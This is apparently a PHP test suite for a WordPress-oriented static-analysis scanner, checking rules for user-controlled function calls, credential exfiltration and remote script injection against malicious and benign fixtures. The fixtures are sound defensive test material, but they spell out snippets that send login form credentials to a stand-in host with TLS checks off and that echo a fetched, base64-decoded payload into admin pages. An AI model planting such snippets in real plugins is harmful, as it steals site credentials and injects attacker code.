<?php
require __DIR__.'/../lib/php-flow.php';
$s = new PressWardenPhpFlow(); $cases = [];
function check_case($name, $code, $expected = []) { global $cases; $cases[] = [$name,'<?php '.$code,$expected]; }
$g = 'if(is_admin() && current_user_can("manage_options")){ $ua=$_SERVER["HTTP_USER_AGENT"]; if(strpos($ua,"Windows") !== false){';
$p = '$r=wp_remote_get("https://example.invalid/payload");$js=base64_decode(wp_remote_retrieve_body($r));';
$c = '$u=$_POST["log"];$p=$_POST["pwd"];$h=curl_init("https://example.invalid/collect");';
$o = 'curl_setopt($h,CURLOPT_SSL_VERIFYPEER,false);curl_setopt($h,CURLOPT_POSTFIELDS,["u"=>$u,"p"=>$p]);';
check_case('direct callable','$f=$_GET["f"]; $f();',['PW-PHP-004']);
check_case('alias callable','$f=$_COOKIE["f"]; $g=$f; $g();',['PW-PHP-004']);
check_case('call_user_func','call_user_func($_REQUEST["f"],"x");',['PW-PHP-004']);
check_case('call_user_func_array','call_user_func_array($_POST["f"],[]);',['PW-PHP-004']);
check_case('absolute API','\\call_user_func($_POST["f"],"x");',['PW-PHP-004']);
check_case('callable reassigned','$f=$_GET["f"]; $f="strlen"; $f("a");');
check_case('callable case-sensitive','$f=$_GET["f"]; $F("a");');
check_case('before assignment','$f("a"); $f=$_GET["f"];');
check_case('separate functions','function a(){ $f=$_GET["f"]; } function b($f){ $f(); }');
check_case('separate methods','class C{function a(){ $f=$_GET["f"]; } function b($f){ $f(); }}');
check_case('comment-only','/* $f=$_GET["f"]; $f(); */');
check_case('quoted example',"\$x = '\$f=\$_GET[\"f\"]; \$f();';");
check_case('strict dispatch allowlist','$f=$_GET["f"];if(in_array($f,["handler_one","handler_two"],true)){$f();}');
check_case('dynamic dispatch allowlist','$f=$_GET["f"];if(in_array($f,$allowed,true)){$f();}',['PW-PHP-004']);
check_case('object API name','$obj->call_user_func($_POST["f"]);');
check_case('static API name','Util::call_user_func($_POST["f"]);');
check_case('callable unset','$f=$_GET["f"];unset($f);$f();');
check_case('compound assignment','$f=$_GET["f"];$f.="safe";$f();');
check_case('cURL credentials',$c.$o.'curl_exec($h);',['PW-PHP-005']);
check_case('cURL explicit true restored',$c.$o.'curl_setopt($h,CURLOPT_SSL_VERIFYPEER,true);curl_exec($h);');
check_case('cURL payload overwritten',$c.$o.'curl_setopt($h,CURLOPT_POSTFIELDS,["status"=>"ok"]);curl_exec($h);');
check_case('cURL executed before options',$c.'curl_exec($h);'.$o);
check_case('cURL different handle',$c.$o.'$j=curl_init("https://example.invalid/status");curl_exec($j);');
check_case('cURL local path',str_replace('https://example.invalid/collect','/tmp/status',$c).$o.'curl_exec($h);');
check_case('cURL one credential',$c.str_replace('"p"=>$p','"p"=>"fixed"',$o).'curl_exec($h);');
check_case('cURL handle alias',$c.$o.'$j=$h;curl_exec($j);',['PW-PHP-005']);
check_case('cURL setopt array',$c.'curl_setopt_array($h,[CURLOPT_SSL_VERIFYPEER=>false,CURLOPT_POSTFIELDS=>["u"=>$u,"p"=>$p]]);curl_exec($h);',['PW-PHP-005']);
check_case('WP request credentials','wp_remote_post("https://example.invalid/collect",["sslverify"=>false,"body"=>["u"=>$_POST["log"],"p"=>$_POST["pwd"]]]);',['PW-PHP-005']);
check_case('WP verified request','wp_remote_post("https://example.invalid/login",["sslverify"=>true,"body"=>["u"=>$_POST["log"],"p"=>$_POST["pwd"]]]);');
check_case('WP unrelated options','wp_remote_post("https://example.invalid/login",["sslverify"=>false,"body"=>["ok"=>true]]);$u=$_POST["log"];$p=$_POST["pwd"];');
check_case('browser raw echo',$g.$p.'echo "<script>".$js."</script>";}}',['PW-PHP-006']);
check_case('browser print',$g.$p.'print $js;}}',['PW-PHP-006']);
check_case('browser inline',$g.$p.'wp_add_inline_script("app",$js);}}',['PW-PHP-006']);
check_case('browser enqueue',$g.$p.'wp_enqueue_script("app",$js);}}',['PW-PHP-006']);
check_case('browser alias',$g.$p.'$out=$js;echo $out;}}',['PW-PHP-006']);
check_case('browser split body',$g.'$r=wp_remote_post("https://example.invalid/payload");$body=wp_remote_retrieve_body($r);$js=base64_decode($body);echo $js;}}',['PW-PHP-006']);
check_case('browser direct expression',$g.'echo base64_decode(file_get_contents("https://example.invalid/payload"));}}',['PW-PHP-006']);
check_case('browser cURL',$g.'$h=curl_init("https://example.invalid/payload");curl_setopt($h,CURLOPT_RETURNTRANSFER,true);$js=base64_decode(curl_exec($h));echo $js;}}',['PW-PHP-006']);
check_case('browser overwritten',$g.$p.'$js="status";echo $js;}}');
check_case('browser escaped',$g.$p.'echo esc_html($js);}}');
check_case('browser unused',$g.$p.'echo "ready";}}');
check_case('wrong script argument',$g.$p.'wp_enqueue_script("app","/app.js",[],$js);}}');
check_case('browser file-local',$g.str_replace('https://example.invalid/payload','/tmp/status',$p).'echo $js;}}');
check_case('unrelated Windows text','if(is_admin()&&current_user_can("manage_options")){$ua=$_SERVER["HTTP_USER_AGENT"];$label="Windows";'.$p.'echo $js;}');
check_case('negative admin gate',str_replace('if(is_admin()', 'if(!is_admin()', $g).$p.'echo $js;}}');
check_case('non-admin OR gate',str_replace(' && ', ' || ', $g).$p.'echo $js;}}');
check_case('no matching Windows gate',str_replace('!== false','=== false',$g).$p.'echo $js;}}');
check_case('gates in other function',$g.'echo "Windows help";}} function render(){'.$p.'echo $js;}');
check_case('flow in sibling methods','class Utility{function admin(){'.$g.'echo "ready";}}} function remote(){'.$p.'} function output($js){echo $js;}}');
check_case('output in closure',$g.$p.'add_action("admin_footer",function()use($js){echo $js;});}}');
check_case('comment gate','/* '.$g.' */ '.$p.'echo $js;');
check_case('multiple rules','$f=$_GET["f"]; $f();'.$c.$o.'curl_exec($h);',['PW-PHP-004','PW-PHP-005']);
check_case('class constant is not declaration','$x=Example::class; $f=$_GET["f"]; $f();',['PW-PHP-004']);
check_case('nowdoc example',"\$x=<<<'TEXT'\n\$f=\$_GET['f']; \$f();\nTEXT;\n");
check_case('separate source/decoder functions',$g.'$r=wp_remote_get("https://example.invalid/payload");}}function decode($r){$js=base64_decode($r);}function output($js){echo $js;}');
check_case('closure overwrites callable','$f=$_GET["f"];$f=function(){return "ok";};$f();');
check_case('return callable','function run(){ $f=$_GET["f"]; return $f(); }',['PW-PHP-004']);
check_case('return call_user_func','function run(){ return call_user_func($_GET["f"]); }',['PW-PHP-004']);
check_case('unknown cURL options invalidate',$c.$o.'curl_setopt_array($h,$otherOptions);curl_exec($h);');
check_case('multiplication overwrites callable','$f=$_GET["f"];$f*=2;$f();');
$ok=0;
foreach($cases as [$name,$code,$want]) {
    $got=$s->scan($code);$ids=array_column($got,'rule');sort($ids);sort($want);
    if($ids!==$want){fwrite(STDERR,"FAIL $name: ".json_encode($ids)." expected ".json_encode($want)."\n");exit(1);}
    foreach($got as $f) if($f['line']<1 || strpos($f['evidence'],'example.invalid')!==false) exit(1);
    ++$ok;
}
foreach(['<?php if(true){','<?php $x="unterminated','<?php }'] as $bad){
    try{$s->scan($bad);fwrite(STDERR,"Malformed input was not reported incomplete\n");exit(1);}catch(RuntimeException $e){}
}
echo "PHP flow: $ok malicious/benign cases and 3 incomplete-input cases passed\n";
